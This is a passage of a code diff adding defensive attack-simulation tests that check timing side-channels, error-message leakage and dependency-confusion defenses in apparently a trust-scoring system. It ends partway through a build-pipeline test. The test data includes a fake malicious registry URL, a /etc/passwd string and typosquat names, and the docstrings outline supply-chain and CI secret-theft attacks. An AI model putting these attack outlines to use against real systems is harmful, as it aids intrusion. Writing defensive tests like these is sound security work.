+        setup_cost_atp=300.0,
+        gain_atp=5000.0 if attack_success else -300.0,
+        roi=16.7 if attack_success else -1.0,
+        detection_probability=0.75,
+        time_to_detection_hours=2,
+        blocks_until_detected=8,
+        trust_damage=0.95,
+        description=f"""
+CONSENSUS SPLIT-BRAIN (Track DN):
+- Partition detection: {"DEFENDED" if defenses["partition_detection"] else "VULNERABLE"}
+  {partition_note}
+- View change protection: {"DEFENDED" if defenses["view_change_protection"] else "VULNERABLE"}
+  {view_note}
+- Leader verification: {"DEFENDED" if defenses["leader_verification"] else "VULNERABLE"}
+  {leader_note}
+- Quorum maintenance: {"DEFENDED" if defenses["quorum_maintenance"] else "VULNERABLE"}
+  {quorum_note}
+- Fork detection: {"DEFENDED" if defenses["fork_detection"] else "VULNERABLE"}
+  {fork_note}
+
+{defenses_held}/{total_defenses} defenses held.
+
+Split-brain attacks cause consensus to diverge, creating competing
+valid histories that are difficult to reconcile.
+""".strip(),
+        mitigation=f"""
+Track DN: Consensus Split-Brain Mitigation:
+1. Monitor connectivity and detect partitions early
+2. Rate-limit view changes and require quorum agreement
+3. Verify leader identity before accepting leader actions
+4. Maintain quorum availability with graceful degradation
+5. Detect and resolve forks through canonical chain selection
+
+Current defenses: {defenses_held}/{total_defenses}
+""".strip(),
+        raw_data={
+            "defenses": defenses,
+            "defenses_held": defenses_held,
+            "total_defenses": total_defenses,
+        }
+    )
+
+
+# ---------------------------------------------------------------------------
+# Track DO: Side-Channel Attacks (Attacks 65-67)
+# ---------------------------------------------------------------------------
+
+def attack_timing_side_channel() -> AttackResult:
+    """
+    ATTACK 65: TIMING SIDE-CHANNEL ATTACK (Track DO)
+
+    Tests attacks that extract information through timing analysis:
+
+    1. Trust Score Inference: Infer trust scores from response times
+    2. Permission Probe: Determine permissions from access timing
+    3. Existence Oracle: Determine entity existence from timing
+    4. Load-Based Inference: Infer activity from processing delays
+    5. Cache Timing: Extract cached data through timing
+
+    Timing attacks can reveal private information without direct access.
+    """
+    import time
+    from datetime import datetime, timezone
+
+    defenses = {
+        "uniform_response_time": False,
+        "permission_timing_masked": False,
+        "existence_timing_masked": False,
+        "load_timing_masked": False,
+        "cache_timing_masked": False,
+    }
+
+    # ========================================================================
+    # Defense 1: Uniform Response Time
+    # ========================================================================
+
+    class UniformResponseTimer:
+        """Ensure responses take uniform time regardless of trust level."""
+
+        def __init__(self, target_time_ms: float = 100.0):
+            self.target_time = target_time_ms / 1000.0  # Convert to seconds
+
+        def timed_response(
+            self, trust_score: float, action_allowed: bool
+        ) -> Tuple[bool, float, str]:
+            """Execute action with uniform timing."""
+            start = time.perf_counter()
+
+            # Simulate varying processing time based on trust
+            # (what an unprotected system might do)
+            actual_work_time = 0.01 * (1.0 + trust_score)
+            time.sleep(actual_work_time)
+
+            # Pad to uniform time
+            elapsed = time.perf_counter() - start
+            if elapsed < self.target_time:
+                time.sleep(self.target_time - elapsed)
+
+            total_time = time.perf_counter() - start
+            return action_allowed, total_time * 1000, "Response delivered"
+
+        def check_uniformity(
+            self, times: List[float], tolerance_ms: float = 5.0
+        ) -> Tuple[bool, str]:
+            """Check if response times are uniform."""
+            if not times:
+                return False, "No times to check"
+
+            variance = max(times) - min(times)
+            if variance <= tolerance_ms:
+                return True, f"Times uniform (variance: {variance:.2f}ms)"
+            return False, f"Times vary (variance: {variance:.2f}ms)"
+
+    timer = UniformResponseTimer(target_time_ms=100.0)
+
+    # Test with different trust levels
+    times = []
+    for trust in [0.1, 0.5, 0.9]:
+        _, elapsed_ms, _ = timer.timed_response(trust, True)
+        times.append(elapsed_ms)
+
+    uniform, msg = timer.check_uniformity(times, tolerance_ms=10.0)
+
+    if uniform:
+        defenses["uniform_response_time"] = True
+        timing_note = f"Uniform response time: {msg}"
+    else:
+        timing_note = f"Timing variance detected: {msg}"
+
+    # ========================================================================
+    # Defense 2: Permission Timing Masking
+    # ========================================================================
+
+    class PermissionTimingMask:
+        """Mask permission check timing."""
+
+        def __init__(self, min_time_ms: float = 50.0):
+            self.min_time = min_time_ms / 1000.0
+            self.permissions = {
+                "admin": {"read", "write", "delete", "admin"},
+                "user": {"read", "write"},
+                "guest": {"read"},
+            }
+
+        def check_permission(
+            self, role: str, action: str
+        ) -> Tuple[bool, float, str]:
+            """Check permission with timing masking."""
+            start = time.perf_counter()
+
+            # Actual check
+            role_perms = self.permissions.get(role, set())
+            allowed = action in role_perms
+
+            # Pad to minimum time regardless of result
+            elapsed = time.perf_counter() - start
+            if elapsed < self.min_time:
+                time.sleep(self.min_time - elapsed)
+
+            total = (time.perf_counter() - start) * 1000
+            return allowed, total, f"Permission check: {allowed}"
+
+    perm_mask = PermissionTimingMask(min_time_ms=50.0)
+
+    # Probe permissions
+    perm_times = []
+    for action in ["read", "write", "delete", "admin", "nonexistent"]:
+        _, elapsed, _ = perm_mask.check_permission("guest", action)
+        perm_times.append(elapsed)
+
+    perm_variance = max(perm_times) - min(perm_times)
+    if perm_variance < 10.0:
+        defenses["permission_timing_masked"] = True
+        perm_note = f"Permission timing masked (variance: {perm_variance:.2f}ms)"
+    else:
+        perm_note = f"Permission timing exposed (variance: {perm_variance:.2f}ms)"
+
+    # ========================================================================
+    # Defense 3: Existence Timing Masking
+    # ========================================================================
+
+    class ExistenceTimingMask:
+        """Mask entity existence through timing."""
+
+        def __init__(self, min_time_ms: float = 30.0):
+            self.min_time = min_time_ms / 1000.0
+            self.entities = {"user_alice", "user_bob", "team_alpha"}
+
+        def lookup(self, entity_id: str) -> Tuple[bool, float, str]:
+            """Lookup entity with timing masking."""
+            start = time.perf_counter()
+
+            exists = entity_id in self.entities
+
+            # Always take minimum time
+            elapsed = time.perf_counter() - start
+            if elapsed < self.min_time:
+                time.sleep(self.min_time - elapsed)
+
+            total = (time.perf_counter() - start) * 1000
+            # Return same message regardless of existence
+            return exists, total, "Lookup complete"
+
+    exist_mask = ExistenceTimingMask(min_time_ms=30.0)
+
+    # Probe existence
+    exist_times = []
+    for entity in ["user_alice", "nonexistent_user", "team_alpha", "fake_team"]:
+        _, elapsed, _ = exist_mask.lookup(entity)
+        exist_times.append(elapsed)
+
+    exist_variance = max(exist_times) - min(exist_times)
+    if exist_variance < 5.0:
+        defenses["existence_timing_masked"] = True
+        exist_note = f"Existence timing masked (variance: {exist_variance:.2f}ms)"
+    else:
+        exist_note = f"Existence timing exposed (variance: {exist_variance:.2f}ms)"
+
+    # ========================================================================
+    # Defense 4: Load-Based Timing Masking
+    # ========================================================================
+
+    class LoadTimingMask:
+        """Mask timing variations due to load."""
+
+        def __init__(self, target_time_ms: float = 75.0):
+            self.target_time = target_time_ms / 1000.0
+            self.load_factor = 1.0
+
+        def set_load(self, factor: float):
+            """Simulate system load."""
+            self.load_factor = max(0.1, min(10.0, factor))
+
+        def process(self, data: str) -> Tuple[str, float, str]:
+            """Process request with load masking."""
+            start = time.perf_counter()
+
+            # Simulate load-dependent processing
+            work_time = 0.01 * self.load_factor
+            time.sleep(work_time)
+
+            # Pad to target
+            elapsed = time.perf_counter() - start
+            if elapsed < self.target_time:
+                time.sleep(self.target_time - elapsed)
+
+            total = (time.perf_counter() - start) * 1000
+            return "processed", total, f"Load factor: {self.load_factor}"
+
+    load_mask = LoadTimingMask(target_time_ms=75.0)
+
+    load_times = []
+    for load in [0.5, 1.0, 2.0, 5.0]:
+        load_mask.set_load(load)
+        _, elapsed, _ = load_mask.process("test")
+        load_times.append(elapsed)
+
+    load_variance = max(load_times) - min(load_times)
+    if load_variance < 10.0:
+        defenses["load_timing_masked"] = True
+        load_note = f"Load timing masked (variance: {load_variance:.2f}ms)"
+    else:
+        load_note = f"Load timing exposed (variance: {load_variance:.2f}ms)"
+
+    # ========================================================================
+    # Defense 5: Cache Timing Masking
+    # ========================================================================
+
+    class CacheTimingMask:
+        """Mask cache hit/miss timing."""
+
+        def __init__(self, target_time_ms: float = 40.0):
+            self.target_time = target_time_ms / 1000.0
+            self.cache: Dict[str, str] = {}
+
+        def get(self, key: str) -> Tuple[Optional[str], float, str]:
+            """Get value with timing masking."""
+            start = time.perf_counter()
+
+            # Actual lookup
+            value = self.cache.get(key)
+            is_hit = value is not None
+
+            # Simulate cache miss work if needed
+            if not is_hit:
+                time.sleep(0.005)  # Simulated fetch
+
+            # Pad to uniform time
+            elapsed = time.perf_counter() - start
+            if elapsed < self.target_time:
+                time.sleep(self.target_time - elapsed)
+
+            total = (time.perf_counter() - start) * 1000
+            return value, total, f"Cache {'hit' if is_hit else 'miss'}"
+
+        def set(self, key: str, value: str):
+            """Set cache value."""
+            self.cache[key] = value
+
+    cache_mask = CacheTimingMask(target_time_ms=40.0)
+    cache_mask.set("cached_key", "cached_value")
+
+    cache_times = []
+    for key in ["cached_key", "uncached_key", "cached_key", "another_uncached"]:
+        _, elapsed, _ = cache_mask.get(key)
+        cache_times.append(elapsed)
+
+    cache_variance = max(cache_times) - min(cache_times)
+    if cache_variance < 5.0:
+        defenses["cache_timing_masked"] = True
+        cache_note = f"Cache timing masked (variance: {cache_variance:.2f}ms)"
+    else:
+        cache_note = f"Cache timing exposed (variance: {cache_variance:.2f}ms)"
+
+    # ========================================================================
+    # Calculate Results
+    # ========================================================================
+
+    defenses_held = sum(defenses.values())
+    total_defenses = len(defenses)
+    attack_success = defenses_held < total_defenses - 2
+
+    return AttackResult(
+        attack_name="Timing Side-Channel (DO)",
+        success=attack_success,
+        setup_cost_atp=50.0,
+        gain_atp=800.0 if attack_success else -50.0,
+        roi=16.0 if attack_success else -1.0,
+        detection_probability=0.40,
+        time_to_detection_hours=168,  # Hard to detect
+        blocks_until_detected=500,
+        trust_damage=0.60,
+        description=f"""
+TIMING SIDE-CHANNEL (Track DO):
+- Uniform response time: {"DEFENDED" if defenses["uniform_response_time"] else "VULNERABLE"}
+  {timing_note}
+- Permission timing masked: {"DEFENDED" if defenses["permission_timing_masked"] else "VULNERABLE"}
+  {perm_note}
+- Existence timing masked: {"DEFENDED" if defenses["existence_timing_masked"] else "VULNERABLE"}
+  {exist_note}
+- Load timing masked: {"DEFENDED" if defenses["load_timing_masked"] else "VULNERABLE"}
+  {load_note}
+- Cache timing masked: {"DEFENDED" if defenses["cache_timing_masked"] else "VULNERABLE"}
+  {cache_note}
+
+{defenses_held}/{total_defenses} defenses held.
+
+Timing side-channels leak private information through observable
+response time variations.
+""".strip(),
+        mitigation=f"""
+Track DO: Timing Side-Channel Mitigation:
+1. Pad all responses to uniform time regardless of internal processing
+2. Mask permission check timing with minimum response times
+3. Hide entity existence through constant-time lookups
+4. Eliminate load-dependent timing variations
+5. Use constant-time cache operations
+
+Current defenses: {defenses_held}/{total_defenses}
+""".strip(),
+        raw_data={
+            "defenses": defenses,
+            "defenses_held": defenses_held,
+            "total_defenses": total_defenses,
+        }
+    )
+
+
+def attack_error_side_channel() -> AttackResult:
+    """
+    ATTACK 66: ERROR MESSAGE SIDE-CHANNEL (Track DO)
+
+    Tests attacks that extract information through error messages:
+
+    1. Username Enumeration: Different errors for valid vs invalid users
+    2. Permission Enumeration: Error messages reveal permission structure
+    3. Stack Trace Leakage: Error details reveal internal structure
+    4. Validation Error Leakage: Validation errors reveal data formats
+    5. Rate Limit Disclosure: Rate limiting reveals user activity
+
+    Detailed errors help developers but leak information to attackers.
+    """
+    from datetime import datetime, timezone
+
+    defenses = {
+        "username_enumeration_blocked": False,
+        "permission_errors_generic": False,
+        "stack_trace_hidden": False,
+        "validation_errors_generic": False,
+        "rate_limit_uniform": False,
+    }
+
+    # ========================================================================
+    # Defense 1: Username Enumeration Prevention
+    # ========================================================================
+
+    class SecureUserLookup:
+        """Prevent username enumeration."""
+
+        def __init__(self):
+            self.users = {
+                "alice": {"password_hash": "hash1", "role": "admin"},
+                "bob": {"password_hash": "hash2", "role": "user"},
+            }
+
+        def authenticate(
+            self, username: str, password: str
+        ) -> Tuple[bool, str]:
+            """Authenticate with generic error messages."""
+            user = self.users.get(username)
+
+            # Always return same error regardless of whether user exists
+            if not user or password != "correct_password":
+                return False, "Invalid credentials"
+
+            return True, "Authentication successful"
+
+        def check_enumeration(self) -> Tuple[bool, str]:
+            """Check if enumeration is possible."""
+            valid_user_error = self.authenticate("alice", "wrong")[1]
+            invalid_user_error = self.authenticate("nonexistent", "wrong")[1]
+
+            if valid_user_error == invalid_user_error:
+                return True, f"Errors identical: '{valid_user_error}'"
+            return False, f"Errors differ: '{valid_user_error}' vs '{invalid_user_error}'"
+
+    user_lookup = SecureUserLookup()
+    secure, msg = user_lookup.check_enumeration()
+
+    if secure:
+        defenses["username_enumeration_blocked"] = True
+        user_note = f"Enumeration blocked: {msg}"
+    else:
+        user_note = f"Enumeration possible: {msg}"
+
+    # ========================================================================
+    # Defense 2: Generic Permission Errors
+    # ========================================================================
+
+    class SecurePermissionCheck:
+        """Return generic permission errors."""
+
+        def __init__(self):
+            self.permissions = {
+                "admin": {"read", "write", "delete", "admin"},
+                "user": {"read", "write"},
+            }
+
+        def check_permission(
+            self, role: str, action: str
+        ) -> Tuple[bool, str]:
+            """Check permission with generic errors."""
+            perms = self.permissions.get(role)
+
+            # Generic error regardless of reason
+            if perms is None or action not in perms:
+                return False, "Access denied"
+
+            return True, "Access granted"
+
+        def check_generic(self) -> Tuple[bool, str]:
+            """Verify errors are generic."""
+            invalid_role_error = self.check_permission("invalid", "read")[1]
+            no_perm_error = self.check_permission("user", "admin")[1]
+
+            if invalid_role_error == no_perm_error:
+                return True, f"Errors identical: '{invalid_role_error}'"
+            return False, f"Errors differ: '{invalid_role_error}' vs '{no_perm_error}'"
+
+    perm_check = SecurePermissionCheck()
+    generic, msg = perm_check.check_generic()
+
+    if generic:
+        defenses["permission_errors_generic"] = True
+        perm_note = f"Permission errors generic: {msg}"
+    else:
+        perm_note = f"Permission errors reveal info: {msg}"
+
+    # ========================================================================
+    # Defense 3: Stack Trace Hiding
+    # ========================================================================
+
+    class SecureErrorHandler:
+        """Hide internal details from errors."""
+
+        def __init__(self, debug_mode: bool = False):
+            self.debug_mode = debug_mode
+
+        def handle_error(self, exc: Exception) -> str:
+            """Handle error with minimal information disclosure."""
+            if self.debug_mode:
+                import traceback
+                return traceback.format_exc()
+
+            # Production: generic message
+            return "An error occurred. Please try again later."
+
+        def check_leakage(self) -> Tuple[bool, str]:
+            """Check if stack traces are hidden."""
+            try:
+                raise ValueError("Internal error with secret_path=/etc/passwd")
+            except Exception as e:
+                error_msg = self.handle_error(e)
+
+                if "secret_path" in error_msg or "Traceback" in error_msg:
+                    return False, f"Stack trace leaked: {error_msg[:100]}..."
+                return True, "Stack trace hidden"
+
+    error_handler = SecureErrorHandler(debug_mode=False)
+    hidden, msg = error_handler.check_leakage()
+
+    if hidden:
+        defenses["stack_trace_hidden"] = True
+        stack_note = f"Stack trace hidden: {msg}"
+    else:
+        stack_note = f"Stack trace leaked: {msg}"
+
+    # ========================================================================
+    # Defense 4: Generic Validation Errors
+    # ========================================================================
+
+    class SecureValidator:
+        """Return generic validation errors."""
+
+        def validate_input(self, field: str, value: str) -> Tuple[bool, str]:
+            """Validate with generic errors."""
+            # Instead of specific: "Email must contain @"
+            # Return generic: "Invalid input"
+            validations = {
+                "email": lambda v: "@" in v and "." in v,
+                "phone": lambda v: v.isdigit() and len(v) >= 10,
+                "password": lambda v: len(v) >= 8,
+            }
+
+            validator = validations.get(field)
+            if validator is None:
+                return False, "Invalid field"
+
+            if not validator(value):
+                return False, "Invalid input"
+
+            return True, "Valid"
+
+        def check_generic(self) -> Tuple[bool, str]:
+            """Verify validation errors are generic."""
+            errors = [
+                self.validate_input("email", "invalid")[1],
+                self.validate_input("phone", "abc")[1],
+                self.validate_input("password", "short")[1],
+            ]
+
+            unique_errors = set(errors)
+            if len(unique_errors) == 1:
+                return True, f"All errors identical: '{errors[0]}'"
+            return False, f"Errors reveal field types: {unique_errors}"
+
+    validator = SecureValidator()
+    generic, msg = validator.check_generic()
+
+    if generic:
+        defenses["validation_errors_generic"] = True
+        validate_note = f"Validation errors generic: {msg}"
+    else:
+        validate_note = f"Validation errors reveal format: {msg}"
+
+    # ========================================================================
+    # Defense 5: Uniform Rate Limiting
+    # ========================================================================
+
+    class UniformRateLimiter:
+        """Rate limit uniformly regardless of user existence."""
+
+        def __init__(self, requests_per_minute: int = 60):
+            self.limit = requests_per_minute
+            self.requests: Dict[str, List[datetime]] = defaultdict(list)
+
+        def check_rate(
+            self, identifier: str
+        ) -> Tuple[bool, str]:
+            """Check rate limit with uniform response."""
+            now = datetime.now(timezone.utc)
+            minute_ago = now - timedelta(minutes=1)
+
+            # Track requests
+            self.requests[identifier] = [
+                t for t in self.requests[identifier]
+                if t > minute_ago
+            ]
+            self.requests[identifier].append(now)
+
+            if len(self.requests[identifier]) > self.limit:
+                return False, "Rate limit exceeded"
+
+            return True, "Request allowed"
+
+        def check_uniform(self) -> Tuple[bool, str]:
+            """Verify rate limiting is uniform."""
+            # Exceed limit for valid user
+            for _ in range(65):
+                self.check_rate("valid_user")
+            valid_user_msg = self.check_rate("valid_user")[1]
+
+            # Exceed limit for invalid user
+            for _ in range(65):
+                self.check_rate("invalid_user_xyz")
+            invalid_user_msg = self.check_rate("invalid_user_xyz")[1]
+
+            if valid_user_msg == invalid_user_msg:
+                return True, f"Rate limiting uniform: '{valid_user_msg}'"
+            return False, f"Rate limiting differs: '{valid_user_msg}' vs '{invalid_user_msg}'"
+
+    rate_limiter = UniformRateLimiter(requests_per_minute=60)
+    uniform, msg = rate_limiter.check_uniform()
+
+    if uniform:
+        defenses["rate_limit_uniform"] = True
+        rate_note = f"Rate limiting uniform: {msg}"
+    else:
+        rate_note = f"Rate limiting reveals user existence: {msg}"
+
+    # ========================================================================
+    # Calculate Results
+    # ========================================================================
+
+    defenses_held = sum(defenses.values())
+    total_defenses = len(defenses)
+    attack_success = defenses_held < total_defenses - 2
+
+    return AttackResult(
+        attack_name="Error Side-Channel (DO)",
+        success=attack_success,
+        setup_cost_atp=30.0,
+        gain_atp=600.0 if attack_success else -30.0,
+        roi=20.0 if attack_success else -1.0,
+        detection_probability=0.35,
+        time_to_detection_hours=336,  # Very hard to detect
+        blocks_until_detected=1000,
+        trust_damage=0.50,
+        description=f"""
+ERROR SIDE-CHANNEL (Track DO):
+- Username enumeration blocked: {"DEFENDED" if defenses["username_enumeration_blocked"] else "VULNERABLE"}
+  {user_note}
+- Permission errors generic: {"DEFENDED" if defenses["permission_errors_generic"] else "VULNERABLE"}
+  {perm_note}
+- Stack trace hidden: {"DEFENDED" if defenses["stack_trace_hidden"] else "VULNERABLE"}
+  {stack_note}
+- Validation errors generic: {"DEFENDED" if defenses["validation_errors_generic"] else "VULNERABLE"}
+  {validate_note}
+- Rate limit uniform: {"DEFENDED" if defenses["rate_limit_uniform"] else "VULNERABLE"}
+  {rate_note}
+
+{defenses_held}/{total_defenses} defenses held.
+
+Error message side-channels leak information through varying error
+responses for different conditions.
+""".strip(),
+        mitigation=f"""
+Track DO: Error Side-Channel Mitigation:
+1. Return identical errors for valid/invalid usernames
+2. Use generic "Access denied" for all permission failures
+3. Never expose stack traces or internal paths in production
+4. Return uniform validation errors without format hints
+5. Apply rate limiting uniformly regardless of user existence
+
+Current defenses: {defenses_held}/{total_defenses}
+""".strip(),
+        raw_data={
+            "defenses": defenses,
+            "defenses_held": defenses_held,
+            "total_defenses": total_defenses,
+        }
+    )
+
+
+# ---------------------------------------------------------------------------
+# Track DP: Supply Chain and Dependency Attacks (Attacks 67-68)
+# ---------------------------------------------------------------------------
+
+def attack_dependency_confusion() -> AttackResult:
+    """
+    ATTACK 67: DEPENDENCY CONFUSION ATTACK (Track DP)
+
+    Tests attacks that exploit package/dependency management:
+
+    1. Namespace Squatting: Register internal package names publicly
+    2. Version Confusion: Exploit version resolution logic
+    3. Typosquatting: Register typo variants of legitimate packages
+    4. Dependency Injection: Inject malicious transitive dependencies
+    5. Registry Poisoning: Compromise package registry integrity
+
+    Supply chain attacks compromise trust at the foundation.
+    """
+    from datetime import datetime, timezone
+    from typing import Set, List, Dict, Optional
+
+    defenses = {
+        "namespace_protection": False,
+        "version_pinning_enforced": False,
+        "typosquat_detection": False,
+        "dependency_audit": False,
+        "registry_verification": False,
+    }
+
+    # ========================================================================
+    # Defense 1: Namespace Protection
+    # ========================================================================
+
+    class NamespaceRegistry:
+        """Protect internal package namespaces."""
+
+        def __init__(self):
+            self.internal_prefixes = {"@company/", "internal-", "private-"}
+            self.registered_packages: Dict[str, dict] = {}
+            self.allowed_registrants: Dict[str, Set[str]] = {
+                "@company/": {"internal_team"},
+                "internal-": {"internal_team"},
+                "private-": {"internal_team"},
+            }
+
+        def register_package(
+            self, name: str, registrant: str
+        ) -> Tuple[bool, str]:
+            """Register a package with namespace protection."""
+            for prefix in self.internal_prefixes:
+                if name.startswith(prefix):
+                    allowed = self.allowed_registrants.get(prefix, set())
+                    if registrant not in allowed:
+                        return False, (
+                            f"Namespace protected: {prefix}* requires "
+                            f"registrant in {allowed}"
+                        )
+
+            self.registered_packages[name] = {
+                "registrant": registrant,
+                "registered_at": datetime.now(timezone.utc),
+            }
+            return True, f"Package {name} registered"
+
+    namespace_reg = NamespaceRegistry()
+
+    # Attacker tries to register internal package
+    valid, msg = namespace_reg.register_package("@company/core-utils", "attacker")
+
+    if not valid:
+        defenses["namespace_protection"] = True
+        namespace_note = f"Namespace protection blocked: {msg}"
+    else:
+        namespace_note = f"Namespace protection failed: {msg}"
+
+    # ========================================================================
+    # Defense 2: Version Pinning Enforcement
+    # ========================================================================
+
+    class VersionPinningEnforcer:
+        """Enforce version pinning in dependencies."""
+
+        def validate_dependency_spec(
+            self, spec: str
+        ) -> Tuple[bool, str]:
+            """Validate dependency specification is pinned."""
+            import re
+
+            # Patterns that are too loose
+            loose_patterns = [
+                r"^\*$",           # *
+                r"^latest$",      # latest
+                r"^\^",           # ^1.0.0 (allows minor updates)
+                r"^~",            # ~1.0.0 (allows patch updates)
+                r"^>=",           # >=1.0.0
+                r"^>",            # >1.0.0
+            ]
+
+            for pattern in loose_patterns:
+                if re.match(pattern, spec):
+                    return False, f"Version spec too loose: {spec}"
+
+            # Valid: exact version like 1.2.3
+            if re.match(r"^\d+\.\d+\.\d+$", spec):
+                return True, f"Version pinned: {spec}"
+
+            return False, f"Invalid version spec: {spec}"
+
+    version_enforcer = VersionPinningEnforcer()
+
+    # Test loose versions
+    specs = ["*", "latest", "^1.0.0", "~1.0.0", ">=1.0.0", "1.2.3"]
+    results = []
+    for spec in specs:
+        valid, msg = version_enforcer.validate_dependency_spec(spec)
+        results.append((spec, valid))
+
+    # Check that loose specs are rejected
+    loose_rejected = all(not v for s, v in results if s != "1.2.3")
+    pinned_accepted = any(v for s, v in results if s == "1.2.3")
+
+    if loose_rejected and pinned_accepted:
+        defenses["version_pinning_enforced"] = True
+        version_note = "Version pinning enforced: loose specs rejected"
+    else:
+        version_note = f"Version pinning weak: {results}"
+
+    # ========================================================================
+    # Defense 3: Typosquat Detection
+    # ========================================================================
+
+    class TyposquatDetector:
+        """Detect typosquatting attempts."""
+
+        def __init__(self, known_packages: set):
+            self.known_packages = known_packages
+
+        def _levenshtein(self, s1: str, s2: str) -> int:
+            """Calculate edit distance."""
+            if len(s1) < len(s2):
+                return self._levenshtein(s2, s1)
+            if len(s2) == 0:
+                return len(s1)
+
+            prev_row = range(len(s2) + 1)
+            for i, c1 in enumerate(s1):
+                curr_row = [i + 1]
+                for j, c2 in enumerate(s2):
+                    insertions = prev_row[j + 1] + 1
+                    deletions = curr_row[j] + 1
+                    substitutions = prev_row[j] + (c1 != c2)
+                    curr_row.append(min(insertions, deletions, substitutions))
+                prev_row = curr_row
+
+            return prev_row[-1]
+
+        def check_typosquat(
+            self, package_name: str, threshold: int = 2
+        ) -> Tuple[bool, str]:
+            """Check if package name is typosquat of known package."""
+            for known in self.known_packages:
+                distance = self._levenshtein(package_name, known)
+                if 0 < distance <= threshold:
+                    return True, (
+                        f"Typosquat detected: '{package_name}' is {distance} "
+                        f"edits from '{known}'"
+                    )
+
+            return False, f"No typosquat detected for '{package_name}'"
+
+    typo_detector = TyposquatDetector({
+        "lodash", "express", "react", "axios", "webpack"
+    })
+
+    # Test typosquats
+    typosquats = ["1odash", "expresss", "reakt", "axois"]
+    detected = 0
+    for typo in typosquats:
+        is_typo, msg = typo_detector.check_typosquat(typo)
+        if is_typo:
+            detected += 1
+
+    if detected >= len(typosquats) - 1:
+        defenses["typosquat_detection"] = True
+        typo_note = f"Typosquat detection: {detected}/{len(typosquats)} caught"
+    else:
+        typo_note = f"Typosquat detection weak: {detected}/{len(typosquats)} caught"
+
+    # ========================================================================
+    # Defense 4: Dependency Audit
+    # ========================================================================
+
+    class DependencyAuditor:
+        """Audit dependencies for known vulnerabilities."""
+
+        def __init__(self):
+            self.known_vulnerabilities = {
+                "vulnerable-pkg@1.0.0": "CVE-2024-1234: RCE vulnerability",
+                "old-crypto@2.0.0": "CVE-2024-5678: Weak encryption",
+            }
+
+        def audit_dependencies(
+            self, dependencies: Dict[str, str]
+        ) -> Tuple[bool, str, List[str]]:
+            """Audit dependencies for vulnerabilities."""
+            vulnerabilities = []
+
+            for pkg, version in dependencies.items():
+                key = f"{pkg}@{version}"
+                if key in self.known_vulnerabilities:
+                    vulnerabilities.append(
+                        f"{key}: {self.known_vulnerabilities[key]}"
+                    )
+
+            if vulnerabilities:
+                return False, "Vulnerabilities found", vulnerabilities
+
+            return True, "No known vulnerabilities", []
+
+    auditor = DependencyAuditor()
+
+    deps = {
+        "safe-pkg": "1.0.0",
+        "vulnerable-pkg": "1.0.0",
+        "another-safe": "2.3.4",
+    }
+
+    passed, msg, vulns = auditor.audit_dependencies(deps)
+
+    if not passed:
+        defenses["dependency_audit"] = True
+        audit_note = f"Dependency audit caught: {vulns[0][:50]}..."
+    else:
+        audit_note = "Dependency audit: no vulnerabilities found"
+
+    # ========================================================================
+    # Defense 5: Registry Verification
+    # ========================================================================
+
+    class RegistryVerifier:
+        """Verify package registry integrity."""
+
+        def __init__(self):
+            self.trusted_registries = {
+                "https://registry.npmjs.org": {
+                    "fingerprint": "abc123",
+                    "tls_required": True,
+                },
+                "https://pypi.org": {
+                    "fingerprint": "def456",
+                    "tls_required": True,
+                },
+            }
+
+        def verify_registry(
+            self, registry_url: str
+        ) -> Tuple[bool, str]:
+            """Verify registry is trusted."""
+            # Check for TLS
+            if not registry_url.startswith("https://"):
+                return False, "Registry must use HTTPS"
+
+            # Check against trusted list
+            if registry_url not in self.trusted_registries:
+                return False, f"Untrusted registry: {registry_url}"
+
+            return True, f"Registry verified: {registry_url}"
+
+        def verify_package_integrity(
+            self, package_name: str, expected_hash: str, actual_hash: str
+        ) -> Tuple[bool, str]:
+            """Verify package hash matches expected."""
+            if expected_hash != actual_hash:
+                return False, (
+                    f"Package integrity failure: {package_name} "
+                    f"expected {expected_hash[:8]}... got {actual_hash[:8]}..."
+                )
+
+            return True, f"Package integrity verified: {package_name}"
+
+    registry_verifier = RegistryVerifier()
+
+    # Test untrusted registry
+    valid, msg = registry_verifier.verify_registry("http://evil-registry.com")
+
+    if not valid:
+        defenses["registry_verification"] = True
+        registry_note = f"Registry verification blocked: {msg}"
+    else:
+        registry_note = f"Registry verification failed: {msg}"
+
+    # ========================================================================
+    # Calculate Results
+    # ========================================================================
+
+    defenses_held = sum(defenses.values())
+    total_defenses = len(defenses)
+    attack_success = defenses_held < total_defenses - 2
+
+    return AttackResult(
+        attack_name="Dependency Confusion (DP)",
+        success=attack_success,
+        setup_cost_atp=200.0,
+        gain_atp=5000.0 if attack_success else -200.0,
+        roi=25.0 if attack_success else -1.0,
+        detection_probability=0.55,
+        time_to_detection_hours=720,  # Can persist for weeks
+        blocks_until_detected=2000,
+        trust_damage=1.00,
+        description=f"""
+DEPENDENCY CONFUSION (Track DP):
+- Namespace protection: {"DEFENDED" if defenses["namespace_protection"] else "VULNERABLE"}
+  {namespace_note}
+- Version pinning: {"DEFENDED" if defenses["version_pinning_enforced"] else "VULNERABLE"}
+  {version_note}
+- Typosquat detection: {"DEFENDED" if defenses["typosquat_detection"] else "VULNERABLE"}
+  {typo_note}
+- Dependency audit: {"DEFENDED" if defenses["dependency_audit"] else "VULNERABLE"}
+  {audit_note}
+- Registry verification: {"DEFENDED" if defenses["registry_verification"] else "VULNERABLE"}
+  {registry_note}
+
+{defenses_held}/{total_defenses} defenses held.
+
+Supply chain attacks compromise the dependency chain, injecting
+malicious code through package management systems.
+""".strip(),
+        mitigation=f"""
+Track DP: Dependency Confusion Mitigation:
+1. Reserve internal namespace prefixes in public registries
+2. Enforce exact version pinning in all dependency specs
+3. Detect typosquatting attempts through edit distance
+4. Audit all dependencies against known vulnerability databases
+5. Verify registry URLs and package hashes before installation
+
+Current defenses: {defenses_held}/{total_defenses}
+""".strip(),
+        raw_data={
+            "defenses": defenses,
+            "defenses_held": defenses_held,
+            "total_defenses": total_defenses,
+        }
+    )
+
+
+def attack_build_pipeline_compromise() -> AttackResult:
+    """
+    ATTACK 68: BUILD PIPELINE COMPROMISE (Track DP)
+
+    Tests attacks that compromise the CI/CD build pipeline:
+
+    1. Secret Exfiltration: Extract secrets from build environment
+    2. Artifact Tampering: Modify build artifacts before signing
+    3. Build Cache Poisoning: Inject malicious content into caches
+    4. Pipeline Configuration Injection: Inject malicious build steps
+    5. Provenance Forgery: Forge build provenance attestations
+
+    Build pipeline attacks can compromise all downstream artifacts.
+    """
+    from datetime import datetime, timezone
+    import hashlib
+
+    defenses = {
+        "secret_isolation": False,
+        "artifact_signing": False,
+        "cache_validation": False,
+        "config_validation": False,
+        "provenance_verification": False,
+    }
+
+    # ========================================================================
+    # Defense 1: Secret Isolation
+    # ========================================================================
+
+    class SecretIsolator:
+        """Isolate secrets from build environment."""
+
